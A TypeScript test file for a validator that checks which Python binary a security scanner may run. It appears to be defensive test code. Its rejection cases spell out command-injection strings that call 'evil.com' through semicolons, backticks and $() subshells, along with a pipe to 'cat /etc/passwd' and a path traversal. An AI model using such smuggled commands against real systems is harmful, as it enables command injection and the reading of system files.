/**
 * Copyright 2026 Cisco Systems, Inc. and its affiliates
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, writeFile, chmod, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { validatePythonBinary } from "../scanners/plugin_scanner/llm_client.js";

let tempDir: string;

beforeEach(async () => {
  tempDir = await mkdtemp(join(tmpdir(), "dc-llm-client-test-"));
});

afterEach(async () => {
  await rm(tempDir, { recursive: true, force: true });
});

describe("validatePythonBinary", () => {
  it("accepts 'python3' from the allowlist", () => {
    expect(validatePythonBinary("python3")).toBe("python3");
  });

  it("accepts 'python' from the allowlist", () => {
    expect(validatePythonBinary("python")).toBe("python");
  });

  it("accepts 'python3.12' from the allowlist", () => {
    expect(validatePythonBinary("python3.12")).toBe("python3.12");
  });

  it("rejects shell injection via semicolon", () => {
    expect(() => validatePythonBinary("python3; curl evil.com")).toThrow(
      /Refusing untrusted python_binary/,
    );
  });

  it("rejects shell injection via backtick", () => {
    expect(() => validatePythonBinary("`curl evil.com`")).toThrow(
      /Refusing untrusted python_binary/,
    );
  });

  it("rejects shell injection via $() subshell", () => {
    expect(() => validatePythonBinary("$(curl evil.com)")).toThrow(
      /Refusing untrusted python_binary/,
    );
  });

  it("rejects relative path with traversal", () => {
    expect(() => validatePythonBinary("../../../bin/python3")).toThrow(
      /Refusing untrusted python_binary/,
    );
  });

  it("rejects non-existent absolute path", () => {
    expect(() =>
      validatePythonBinary("/nonexistent/path/to/python3"),
    ).toThrow(/Refusing untrusted python_binary/);
  });

  it("accepts valid absolute path to an existing executable", async () => {
    const fakePython = join(tempDir, "python3");
    await writeFile(fakePython, "#!/bin/sh\nexit 0\n");
    await chmod(fakePython, 0o755);

    const result = validatePythonBinary(fakePython);
    expect(result).toBe(fakePython);
  });

  it("rejects a pipe-based injection attempt", () => {
    expect(() => validatePythonBinary("python3 | cat /etc/passwd")).toThrow(
      /Refusing untrusted python_binary/,
    );
  });

  it("rejects empty-looking names not in allowlist", () => {
    expect(() => validatePythonBinary("python4")).toThrow(
      /Refusing untrusted python_binary/,
    );
  });
});
